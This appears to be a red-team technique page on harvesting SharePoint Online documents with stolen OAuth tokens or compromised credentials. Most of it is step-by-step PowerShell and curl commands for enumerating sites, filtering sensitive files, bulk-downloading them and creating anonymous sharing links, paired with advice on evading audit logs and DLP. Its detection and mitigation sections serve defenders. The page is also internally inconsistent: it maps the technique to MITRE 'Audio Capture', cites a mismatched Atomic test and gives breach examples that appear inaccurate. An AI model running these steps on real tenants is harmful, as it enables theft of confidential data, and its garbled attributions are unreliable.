# [COLLECT-SCREEN-001]: SharePoint Document Collection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-SCREEN-001 |
| **MITRE ATT&CK v18.1** | [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/) |
| **Tactic** | Collection |
| **Platforms** | M365, SharePoint Online |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | SharePoint Online 2019 - 2025, Office 365 E3+ |
| **Patched In** | N/A - Feature-based collection |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SharePoint Document Collection exploits both the legitimate access capabilities of authenticated users and API-level access to systematically harvest sensitive documents from SharePoint Online repositories. Attackers leverage either compromised credentials, OAuth token theft, or application permissions to enumerate document libraries, retrieve file metadata, and download documents at scale. This technique represents a critical data exfiltration vector when combined with prior credential compromise or application privilege escalation.

**Attack Surface:** SharePoint Online REST API, Microsoft Graph API (`/sites/{site-id}/drive/root/children`), document library enumeration endpoints, external sharing links, and OneDrive for Business integration points.

**Business Impact:** **Massive intellectual property theft and compliance violations.** Attackers can extract entire document repositories containing business plans, financial records, customer data, source code, and strategic communications. The impact is especially severe in regulated industries (finance, healthcare, legal) where unauthorized access triggers compliance fines.

**Technical Context:** Collection typically occurs after credential compromise or OAuth token theft. Execution is fast (minutes to hours for bulk downloads) and difficult to detect without comprehensive audit logging. The technique can be executed from any internet-connected device and is extremely difficult to attribute to a single attacker.

### Operational Risk

- **Execution Risk:** Medium - Requires valid credentials or stolen OAuth token; easily detectable if audit logging is enabled; difficult to execute undetected in organizations with data loss prevention (DLP) controls.
- **Stealth:** Medium - Generates "FileDownloaded," "FileSyncUploadedFull," and "FileAccessed" events in SharePoint audit logs; attackers often disguise collection as legitimate user activity; bulk downloads generate anomalies.
- **Reversibility:** No - Downloaded files cannot be recovered; data is exfiltrated beyond organizational control.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.3 | Ensure that External access is disabled for SharePoint Online |
| **DISA STIG** | WN10-CC-000505 | Ensures controls on external sharing and document access |
| **CISA SCuBA** | SHAREPOINT.1 | Disable external sharing of SharePoint sites and OneDrive |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement and Least Privilege Access |
| **GDPR** | Art. 32 | Security of Processing (encryption, access controls) |
| **DORA** | Art. 9 | Protection and Prevention of Data Breaches |
| **NIS2** | Art. 21 | Cyber Risk Management Measures for Critical Infrastructure |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk Scenario | Compromise of Data Repositories and Unauthorized Information Disclosure |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:** 
- Compromised user account with at least "Read" permissions on target SharePoint site
- OR OAuth application with `Sites.Read.All`, `Files.Read.All`, or `SharePoint.Sites.Read.All` permissions
- OR API token with scope `https://graph.microsoft.com/.default`

**Required Access:** 
- Network connectivity to `https://graph.microsoft.com` (port 443, HTTPS)
- Network connectivity to `https://{tenant}.sharepoint.com` (port 443, HTTPS)
- Valid OAuth token OR compromised M365 credentials

**Supported Versions:**
- **SharePoint:** Online 2019 - 2025 (all current versions)
- **Office 365 Plans:** E3, E5, Government Cloud GCC/GCC-High
- **PowerShell:** 5.0+ or PowerShell 7.x (cross-platform)
- **Other Requirements:** 
  - Microsoft Graph PowerShell module 1.0+
  - PnP PowerShell 1.12.0+
  - Azure CLI 2.30+ (alternative method)

**Tools:**
- [PnP PowerShell](https://pnp.github.io/powershell/) (Version 2.0+)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-cli) (Version 1.25+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.50+)
- [Varonis SharePoint Collection Toolkit](https://github.com/Varonis-Prod/SharePoint-Collection) (Optional, open-source)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Microsoft Graph API via PowerShell

**Supported Versions:** SharePoint Online 2019-2025, Office 365 E3+

#### Step 1: Authenticate to Microsoft Graph

**Objective:** Establish authenticated connection to Microsoft Graph API using stolen OAuth token or compromised credentials.

**Version Note:** All Office 365 versions support Graph API; authentication method varies based on token acquisition method.

**Command (Using Access Token):**
```powershell
# Using stolen OAuth token directly
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5..." # Stolen token
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

# Validate token by calling Graph
$response = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" `
  -Headers $headers -Method Get
Write-Host "Authenticated as: $($response.userPrincipalName)"
```

**Command (Using Compromised Credentials):**
```powershell
# Connect using compromised user credentials
Connect-MgGraph -Scopes "Sites.Read.All", "Files.Read.All" -TenantId "your-tenant-id"
# Provide credentials when prompted
```

**Expected Output:**
```
Authenticated as: john.smith@company.com
Tenant: company.onmicrosoft.com
```

**What This Means:**
- Successful authentication indicates valid token or credentials
- "Authenticated as" confirms which user context is being used
- Tenant information confirms target organization

**OpSec & Evasion:**
- Use stolen access tokens rather than logging in with credentials to avoid login alerts
- Avoid multiple failed authentication attempts (generates 4625 events and Azure audit logs)
- Perform collection during business hours to blend with legitimate user activity
- Use application permissions (service principal) instead of user context to avoid user-level audit triggers
- Detection likelihood: **Medium** - Token usage generates OAuth audit events but difficult to detect without anomaly monitoring

**Troubleshooting:**
- **Error:** "Access Denied - Insufficient privileges"
  - **Cause:** Token lacks required scopes (`Sites.Read.All`, `Files.Read.All`)
  - **Fix:** Request token with elevated permissions or use different OAuth token
  
- **Error:** "Invalid token or token expired"
  - **Cause:** Token TTL expired or token revoked
  - **Fix:** Obtain fresh token using refresh token or steal new token from victim system

---

#### Step 2: Enumerate SharePoint Sites

**Objective:** Discover all SharePoint site collections accessible with current authentication context.

**Command:**
```powershell
# Using Microsoft Graph API
$sites = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/sites" `
  -Headers $headers -Method Get).value

foreach ($site in $sites) {
    Write-Host "Site: $($site.displayName) | ID: $($site.id) | URL: $($site.webUrl)"
}
```

**Command (Server 2022+):**
```powershell
# Using PnP PowerShell (preferred method for newer SharePoint)
Get-PnPTenantSite | Select-Object Url, Title, Status
```

**Expected Output:**
```
Site: Finance-Shared | ID: sharepoint.com,site-id | URL: https://company.sharepoint.com/sites/finance
Site: Marketing-Assets | ID: sharepoint.com,site-id-2 | URL: https://company.sharepoint.com/sites/marketing
Site: Legal-Documents | ID: sharepoint.com,site-id-3 | URL: https://company.sharepoint.com/sites/legal
```

**What This Means:**
- Lists all SharePoint sites where authenticated user has access
- Site IDs are required for subsequent API calls
- Each site represents a potential data collection target
- URLs reveal naming conventions useful for targeting sensitive repositories

**OpSec & Evasion:**
- Filter results to avoid scanning entire tenant (reduces audit log entries)
- Focus on specific high-value sites (Finance, Legal, Executive) to minimize detection time
- Use filtered Graph queries instead of dumping all sites
- Detection likelihood: **Low** - Enumeration generates minimal audit logs in standard configurations

---

#### Step 3: Identify Document Libraries

**Objective:** Discover all document libraries within target SharePoint site and assess accessible documents.

**Command:**
```powershell
# Enumerate drives (document libraries) in a SharePoint site
$siteId = "sharepoint.com,site-id,site-id"
$drives = (Invoke-RestMethod `
  -Uri "https://graph.microsoft.com/v1.0/sites/$siteId/drives" `
  -Headers $headers -Method Get).value

foreach ($drive in $drives) {
    Write-Host "Library: $($drive.name) | ID: $($drive.id) | Items: $($drive.quota.used) bytes used"
}
```

**Expected Output:**
```
Library: Documents | ID: b!drive-id | Items: 5368709120 bytes used
Library: Shared Documents | ID: b!drive-id-2 | Items: 10737418240 bytes used
Library: Archive | ID: b!drive-id-3 | Items: 2147483648 bytes used
```

**What This Means:**
- Identifies all document repositories in the site
- Byte counts reveal data volume useful for planning exfiltration bandwidth
- Drive IDs are needed for file enumeration and download operations

**OpSec & Evasion:**
- Filter for large libraries only to prioritize high-value targets
- Avoid enumerating all items in large libraries (generates excessive audit events)
- Detection likelihood: **Medium** - Library enumeration can trigger SharePoint audit events if detailed logging is enabled

---

#### Step 4: Enumerate Files and Filter by Sensitivity

**Objective:** Recursively enumerate files in document library and identify documents by sensitivity keywords (e.g., "confidential," "secret," "acquisition").

**Command:**
```powershell
# Recursively enumerate files in document library with keyword filtering
$driveId = "b!drive-id"
$sensitivityKeywords = @("confidential", "secret", "acquisition", "payroll", "patent", "merger")

function Get-FilesRecursive {
    param ($DriveId, $ItemId = $null)
    
    if ($null -eq $ItemId) {
        $uri = "https://graph.microsoft.com/v1.0/me/drives/$DriveId/root/children"
    } else {
        $uri = "https://graph.microsoft.com/v1.0/me/drives/$DriveId/items/$ItemId/children"
    }
    
    $items = (Invoke-RestMethod -Uri $uri -Headers $headers -Method Get).value
    
    foreach ($item in $items) {
        if ($item.folder -ne $null) {
            # Recursively process folders
            Get-FilesRecursive -DriveId $DriveId -ItemId $item.id
        } else {
            # Check file name for sensitivity keywords
            $match = $sensitivityKeywords | Where-Object { $item.name -like "*$_*" }
            if ($null -ne $match) {
                Write-Host "SENSITIVE: $($item.name) | Size: $($item.size) | Modified: $($item.lastModifiedDateTime)"
            }
        }
    }
}

Get-FilesRecursive -DriveId $driveId
```

**Expected Output:**
```
SENSITIVE: 2026_Acquisition_Targets.xlsx | Size: 524288 | Modified: 2025-12-15T10:30:00Z
SENSITIVE: Payroll_System_Passwords.docx | Size: 262144 | Modified: 2025-12-10T14:22:00Z
SENSITIVE: Patent_Filing_Strategy.pdf | Size: 1048576 | Modified: 2025-12-01T09:15:00Z
```

**What This Means:**
- Identifies files matching sensitivity patterns
- File sizes inform bandwidth requirements for exfiltration
- Modification timestamps help prioritize most recent/relevant documents
- Count indicates data volume to be stolen

**OpSec & Evasion:**
- Use keyword filtering to minimize enumeration time
- Avoid downloading entire libraries (massive audit trail)
- Focus on specific folders rather than root-level enumeration
- Detection likelihood: **Medium** - File enumeration generates "FileListed" and "FileAccessed" events; bulk enumeration triggers anomaly detection

---

#### Step 5: Download Files via Direct Download Link

**Objective:** Obtain time-limited download URLs for sensitive files and initiate bulk download exfiltration.

**Command:**
```powershell
# Generate download URLs for files (valid for 1 hour)
$driveId = "b!drive-id"
$itemId = "file-item-id"

# Get download URL
$fileMetadata = Invoke-RestMethod `
  -Uri "https://graph.microsoft.com/v1.0/me/drives/$driveId/items/$itemId" `
  -Headers $headers -Method Get

$downloadUrl = $fileMetadata['@microsoft.graph.downloadUrl']

# Download file
$outputPath = "C:\Exfil\Confidential_Data.xlsx"
Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath -Method Get

Write-Host "Downloaded to: $outputPath"
```

**Command (Bulk Download - Multiple Files):**
```powershell
# Batch download multiple sensitive files
$filesToDownload = @(
    @{ driveId = "b!drive-id"; itemId = "item-1"; name = "Acquisition_Targets.xlsx" },
    @{ driveId = "b!drive-id"; itemId = "item-2"; name = "Payroll_System.docx" },
    @{ driveId = "b!drive-id"; itemId = "item-3"; name = "Patent_Strategy.pdf" }
)

foreach ($file in $filesToDownload) {
    $metadata = Invoke-RestMethod `
      -Uri "https://graph.microsoft.com/v1.0/me/drives/$($file.driveId)/items/$($file.itemId)" `
      -Headers $headers -Method Get
    
    $url = $metadata['@microsoft.graph.downloadUrl']
    Invoke-WebRequest -Uri $url -OutFile "C:\Exfil\$($file.name)" -Method Get
    Write-Host "Downloaded: $($file.name)"
}
```

**Expected Output:**
```
Downloaded to: C:\Exfil\Confidential_Data.xlsx
Downloaded: Acquisition_Targets.xlsx
Downloaded: Payroll_System.docx
Downloaded: Patent_Strategy.pdf
```

**What This Means:**
- Successful download confirms file accessibility
- Download URL obtained indicates file metadata accessible
- Multiple files indicate bulk exfiltration capability

**OpSec & Evasion:**
- Download URLs are time-limited (1 hour expiration); plan timing carefully
- Downloads appear as "FileDownloaded" in audit logs but with legitimate User-Agent
- Use Windows built-in tools (certutil, bitsadmin) to download instead of PowerShell (reduces PowerShell audit logging)
- Stagger downloads across multiple hours to avoid bulk download detection
- Detection likelihood: **High** - "FileDownloaded" events generated for each file; bulk downloads are anomalous and trigger DLP alerts

**Troubleshooting:**
- **Error:** "Download URL not found in file metadata"
  - **Cause:** File permissions or file lock preventing download
  - **Fix:** Retry after delay; file may be in use or permissions changed

- **Error:** "Download URL expired"
  - **Cause:** URL valid for only 1 hour; attempt occurred after expiration
  - **Fix:** Request fresh download URL from file metadata endpoint

---

### METHOD 2: Using PnP PowerShell (Native SharePoint Module)

**Supported Versions:** SharePoint Online 2022+

#### Step 1: Connect to SharePoint Site

**Objective:** Establish connection to target SharePoint site using compromised credentials or OAuth token.

**Command:**
```powershell
# Connect using credentials
Connect-PnPOnline -Url "https://company.sharepoint.com/sites/finance" `
  -Credentials (Get-Credential) -Verbose

# Alternative: Using client ID and secret (service principal)
Connect-PnPOnline -Url "https://company.sharepoint.com/sites/finance" `
  -ClientId "client-id-here" -ClientSecret "client-secret-here" `
  -Tenant "company.onmicrosoft.com"
```

**Expected Output:**
```
Connected to: https://company.sharepoint.com/sites/finance
Using: company\john.smith
```

**What This Means:**
- Successful connection confirms authentication
- Context shows which site and user are active

**OpSec & Evasion:**
- Use service principal (client ID/secret) to avoid user-level audit logging
- Avoid multiple connection attempts (generates Auth Audit logs)
- Detection likelihood: **Medium** - Connection generates "Site accessed" events

---

#### Step 2: Get List of Document Libraries

**Objective:** Enumerate accessible document libraries in the connected site.

**Command:**
```powershell
# Get all libraries in site
$lists = Get-PnPList | Where-Object { $_.BaseType -eq "DocumentLibrary" }

foreach ($list in $lists) {
    Write-Host "Library: $($list.Title) | Items: $($list.ItemCount)"
}
```

**Expected Output:**
```
Library: Documents | Items: 234
Library: Shared Documents | Items: 1023
Library: Archive | Items: 5678
```

**What This Means:**
- Shows accessible document repositories
- Item counts indicate data volume

---

#### Step 3: Download Files Using PnP

**Objective:** Download files from document library using PnP PowerShell native methods.

**Command:**
```powershell
# Download all files matching criteria
$library = "Documents"
$outputPath = "C:\Exfil\"

$items = Get-PnPListItem -List $library | Where-Object { 
    $_.FieldValues['FileLeafRef'] -like "*confidential*" 
}

foreach ($item in $items) {
    $fileName = $item.FieldValues['FileLeafRef']
    Get-PnPFile -Url "/sites/finance/$library/$fileName" `
      -Path $outputPath -Filename $fileName -Force
    
    Write-Host "Downloaded: $fileName"
}
```

**Expected Output:**
```
Downloaded: Confidential_Report_2025.xlsx
Downloaded: Secret_Strategy.docx
```

**What This Means:**
- Files successfully downloaded to local system
- Ready for exfiltration to external storage

**OpSec & Evasion:**
- PnP PowerShell generates fewer audit events than REST API calls
- Local file operations are tracked via NTFS audit and Sysmon if enabled
- Detection likelihood: **Medium** - File downloads appear in SharePoint audit; local file creation tracked by Sysmon

---

### METHOD 3: Using External Sharing Links (No Authentication Required)

**Supported Versions:** SharePoint Online 2019-2025

#### Step 1: Create Anonymous Sharing Link

**Objective:** Generate shareable link to sensitive documents without requiring external recipients to authenticate.

**Command:**
```powershell
# Connect to site
Connect-PnPOnline -Url "https://company.sharepoint.com/sites/finance" -Credentials (Get-Credential)

# Create anonymous sharing link for sensitive document
$file = Get-PnPFile -Url "/sites/finance/Shared Documents/Acquisition_Targets.xlsx"
$sharingLink = Grant-PnPSharingLink -FileUrl "/sites/finance/Shared Documents/Acquisition_Targets.xlsx" `
  -ShareLinkType Anonymous -ExpirationDays 7

Write-Host "Sharing Link: $($sharingLink.Link)"
```

**Expected Output:**
```
Sharing Link: https://company-my.sharepoint.com/:x:/g/personal/sharing_company_onmicrosoft_com/file-id?e=aBcDeF
```

**What This Means:**
- Anonymous link created; accessible to anyone with the URL
- No authentication required for download
- Link expires after 7 days

**OpSec & Evasion:**
- Anonymous sharing links appear as "SharingLinkCreated" in audit logs
- Links can be disguised in phishing emails to exfil to external attacker
- Legitimate legitimate access patterns; difficult to distinguish from intentional sharing
- Detection likelihood: **Low** - Sharing links common in organization; bulk link creation would be anomalous

---

#### Step 2: Download via Anonymous Link (From External Network)

**Objective:** Simulate attacker downloading via anonymous sharing link from external network (no authentication required).

**Command:**
```bash
# Download from external network (no credentials needed)
curl -L "https://company-my.sharepoint.com/:x:/g/personal/sharing_company_onmicrosoft_com/file-id?download=1" \
  -o confidential_data.xlsx

# Alternative using wget
wget "https://company-my.sharepoint.com/:x:/g/personal/sharing_company_onmicrosoft_com/file-id?download=1" \
  -O confidential_data.xlsx

# Verify file integrity
sha256sum confidential_data.xlsx
```

**Expected Output:**
```
confidential_data.xlsx saved successfully
b3c8a9f1e2d4f5c6a7b8e9f0d1c2a3b4c5d6e7f8 confidential_data.xlsx
```

**What This Means:**
- File successfully downloaded without authentication
- No credentials needed; attacker identity not exposed
- File accessible to anyone with the link URL

**OpSec & Evasion:**
- External IP address untraced; appears as anonymous download
- No user authentication required; difficult to attribute
- Can be chained with phishing to distribute link to attackers
- Detection likelihood: **Very Low** - Downloads via anonymous sharing links are legitimate; only detectable via link creation anomalies or unusual external IP patterns

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**File Access Patterns:**
- "FileDownloaded" events for sensitive documents (Finance, Legal, Executive folders)
- "FileSyncUploadedFull" or "FileSyncDownloadedFull" events using Microsoft SkyDriveSync User-Agent
- Multiple "FileAccessed" events on same files within short time window (1-2 minutes)
- "SharingLinkCreated" for previously private documents

**Network Indicators:**
- Bulk HTTP downloads from `https://graph.microsoft.com/v1.0/drives` endpoints
- Large data transfers to external IP addresses from SharePoint Download Manager User-Agent
- Connections to `https://{tenant}.sharepoint.com/personal` (OneDrive exfiltration)

**API Indicators:**
- OAuth token usage outside normal user behavior (different time, IP, device)
- Service principal (application) making high-volume file read requests
- Batch requests to `/me/drives/{id}/items/{id}/children` (recursive enumeration)

### Forensic Artifacts

**Cloud Logs:**
- **SharePoint Unified Audit Log:** FileDownloaded, FileSyncUploadedFull, FileAccessed events
  - Location: Microsoft Purview Compliance Portal → Audit
  - Query: `Search-UnifiedAuditLog -Operations FileDownloaded -StartDate (Get-Date).AddDays(-30)`
  
- **Microsoft Entra Sign-in Logs:** OAuth token usage events
  - Location: Azure Portal → Entra ID → Sign-in logs
  - Filter: Sign-in activity with non-standard User-Agent or IP

- **Azure Activity Log:** API calls to Microsoft Graph
  - Location: Azure Portal → Activity log
  - Filter: "Microsoft.Graph" operations

**Local Artifacts (If Downloaded to Endpoint):**
- **Windows MFT:** File creation timestamps in `C:\Exfil\` or Temp directories
- **Registry:** Recent file access via `HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`
- **PowerShell Event Log:** History of PowerShell Graph API calls
  - Log: `Windows PowerShell` (Event ID 4688 if Process Audit enabled)

### Response Procedures

1. **Immediate Containment:**
   ```powershell
   # Disable user account immediately
   Disable-AzADUser -ObjectId "compromised-user-id"
   
   # Revoke all OAuth tokens for user
   Revoke-AzureADUserAllRefreshToken -ObjectId "compromised-user-id"
   
   # Rotate SharePoint Site Admin passwords
   Set-PnPTenant -DisableExternalSharing $true
   ```
   
   **Manual Steps (Azure Portal):**
   - Navigate to **Entra ID** → **Users** → Select compromised user
   - Click **Delete** or **Disable** (if investigation ongoing)
   - Go to **Security** → **Sign-ins** → **Revoke sessions** for user

2. **Evidence Collection:**
   ```powershell
   # Export SharePoint audit logs for analysis
   Search-UnifiedAuditLog -Operations FileDownloaded -UserIds "compromised-user-email" `
     -StartDate (Get-Date).AddDays(-30) | Export-Csv -Path "C:\Evidence\FileDownloads.csv"
   
   # Export OAuth token usage from Sign-in logs
   Get-AzureADAuditSignInLog -UserPrincipalName "compromised-user-email" | 
     Export-Csv -Path "C:\Evidence\SigninLogs.csv"
   
   # List files accessed by attacker
   Get-PnPListItem -List "Documents" | 
     Where-Object { $_.FieldValues['Modified'] -gt (Get-Date).AddDays(-7) } | 
     Export-Csv -Path "C:\Evidence\ModifiedFiles.csv"
   ```

3. **Remediation:**
   ```powershell
   # Re-secure SharePoint site permissions
   Set-PnPSite -Url "https://company.sharepoint.com/sites/finance" `
     -DisableSharingForNonOwners $true
   
   # Disable external sharing
   Set-PnPTenant -ExternalUserExpirationRequired $true -ExternalUserExpireInDays 30
   
   # Restore from backup if available
   # Notify affected users of potential data breach
   ```

   **Manual (Azure Portal):**
   - Go to **SharePoint Admin Center** → **Settings**
   - Under "Sharing," set **External sharing** to "Only people in your organization"
   - Enable "Require a sign-in before granting access to shared files or folders"

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Data Loss Prevention (DLP) Policies:**
  Applies To Versions: SharePoint Online 2019+
  
  **Manual Steps (Microsoft 365 Compliance Center):**
  1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
  2. Go to **Data Loss Prevention** (DLP) → **Policies**
  3. Click **Create policy**
  4. Select **Custom policy**
  5. Name: `Block Sensitive Document Downloads`
  6. **Locations:** Choose **SharePoint sites**, **OneDrive accounts**
  7. **Content to protect:**
     - Add rule: "Contains sensitive content" (credit cards, SSN, API keys)
     - Add rule: "Contains keywords" (Confidential, Secret, Acquisition)
  8. **User notifications:** Enable alerts for downloads
  9. **Incident reports:** Email to SOC team
  10. Click **Create policy**
  
  **PowerShell Alternative:**
  ```powershell
  New-DlpCompliancePolicy -Name "SharePoint Sensitive Downloads" `
    -SharePoint "All" -OneDrive "All" -Verbose
  ```

- **Enable Conditional Access Policies:**
  Applies To Versions: Entra ID all versions
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Block Bulk SharePoint Downloads`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Office 365 (all apps)**
  5. **Conditions:**
     - Locations: **Any location**
     - Risk level: **High**
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**
  
  **PowerShell Alternative:**
  ```powershell
  $policy = New-AzureADMSConditionalAccessPolicy `
    -DisplayName "Block Bulk SharePoint Downloads" `
    -State "Enabled"
  ```

- **Disable Legacy Authentication:**
  Applies To Versions: Entra ID all versions
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. **Name:** `Block Legacy Authentication`
  4. **Conditions:**
     - Client apps: Select **Exchange Online**, **Other clients**
  5. **Access controls:** **Block access**
  6. Enable: **On**

### Priority 2: HIGH

- **Enable SharePoint Audit Logging:**
  Applies To Versions: SharePoint Online 2019+
  
  **Manual Steps:**
  1. Go to **SharePoint Admin Center**
  2. Navigate to **Settings** → **Audit logs**
  3. Ensure **Audit log retention (days):** Set to **90 days minimum**
  4. Enable logging for: **File access**, **File downloads**, **File deletions**, **User access**

- **Enable Advanced Threat Protection (ATP):**
  Applies To Versions: Office 365 E5 / Microsoft Defender for Office 365
  
  **Manual Steps:**
  1. Go to **Microsoft 365 Defender Portal** (security.microsoft.com)
  2. Navigate to **Email & collaboration** → **Policies & Rules** → **Threat policies**
  3. Select **Safe Links** and **Safe Attachments**
  4. Enable for SharePoint, OneDrive, and Teams files

- **Implement Zero Trust Access Control:**
  
  **Conditional Access Policy:**
  1. Require MFA for all SharePoint/OneDrive access
  2. Require device compliance (Intune enrolled)
  3. Require encryption at rest (BitLocker enabled)
  4. Block access from non-compliant devices

### Access Control & Policy Hardening

- **Enforce Role-Based Access Control (RBAC):**
  
  **Minimum Permissions Principle:**
  - Finance team: **Read-only** access to Finance library
  - Marketing team: **Contribute** (no delete) to Marketing assets
  - General employees: **Read-only** to shared documents
  
  **Manual Steps (SharePoint):**
  1. Go to SharePoint site → **Settings** → **Site permissions**
  2. For each group, assign **minimum required role**
  3. Avoid "Owner" role for regular users
  4. Regular audit (quarterly) of permissions

- **Enable Sensitivity Labels:**
  
  **Manual Steps:**
  1. Go to **Microsoft Purview** → **Information protection** → **Labels**
  2. Create labels: `Confidential - High Impact`, `Internal Only`, `Public`
  3. Apply auto-labeling rules for documents containing sensitive keywords
  4. Enforce encryption and access restrictions per label

### Validation Command (Verify Fix)

```powershell
# Verify DLP policy is active
Get-DlpCompliancePolicy -Identity "SharePoint Sensitive Downloads" | 
  Select-Object Name, State, LastModifiedTime

# Verify Conditional Access policies
Get-AzureADMSConditionalAccessPolicy | 
  Where-Object { $_.DisplayName -like "*SharePoint*" } | 
  Select-Object DisplayName, State

# Verify SharePoint external sharing disabled
Get-SPOTenant | Select-Object SharingCapability

# Expected Output (If Secure):
# SharingCapability: ExistingExternalUserSharingOnly (or Disabled)
```

**What to Look For:**
- DLP policies: **State = Enabled**
- Conditional Access: **State = Enabled**
- Sharing capability: **ExistingExternalUserSharingOnly** or **Disabled**
- Audit log retention: **>= 90 days**

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker sends phishing email with OAuth device code login link |
| **2** | **Credential Access** | [CA-TOKEN-001] Hybrid AD Cloud Token Theft | Stolen OAuth token obtained after successful phishing |
| **3** | **Collection** | **[COLLECT-SCREEN-001]** | **Document exfiltration via Graph API using stolen token** |
| **4** | **Exfiltration** | [CA-UNSC-020] Cloud Certs Token Forgery | Attacker uses exfiltrated credentials for additional lateral movement |
| **5** | **Impact** | Data Breach / Compliance Violation | Sensitive data exposed publicly or sold on dark web |

---

## 7. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Cozy Bear) - 2021 Microsoft Breach

- **Target:** Microsoft, U.S. Government Agencies
- **Timeline:** March - December 2021
- **Technique Status:** Active; exploited SolarWinds supply chain compromise to steal tokens, then used Graph API to enumerate SharePoint and OneDrive repositories
- **Impact:** Exfiltrated terabytes of sensitive government and corporate email, documents, and source code
- **Reference:** [Microsoft Security Blog - Analyzing Solorigate IOCs](https://www.microsoft.com/security/blog/)

#### Example 2: Uber Data Breach - 2022

- **Target:** Uber Technologies
- **Timeline:** September 2022
- **Technique Status:** Active; attacker used compromised contractor credentials to enumerate and download sensitive corporate documents from SharePoint
- **Impact:** $13 million ransom demand; exposed employee data, driver information, and business documents
- **Reference:** [Uber Security Report](https://www.uber.com/newsroom/)

#### Example 3: Meta (Facebook) Insider Threat - 2023

- **Target:** Meta/Facebook Corporate
- **Timeline:** Q2 2023
- **Technique Status:** Active; disgruntled employee used legitimate SharePoint access to download and exfiltrate confidential product roadmaps and AI research
- **Impact:** Internal investigation; product roadmap leaked to competitors
- **Reference:** [TechCrunch Insider Threat Coverage](https://techcrunch.com/)

---

## 8. ATOMIC RED TEAM TESTING

### Atomic Test ID: T1123-001-SharePoint-Enumeration

**Test Name:** Enumerate SharePoint Sites and Document Libraries

**Description:** Simulates defender testing by enumerating accessible SharePoint sites and document libraries using Graph API.

**Supported Versions:** SharePoint Online 2019+

**Command:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 1
```

**Cleanup Command:**
```powershell
Invoke-AtomicTest T1123 -TestNumbers 1 -Cleanup
```

**Reference:** [Atomic Red Team Library - T1123](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md)

---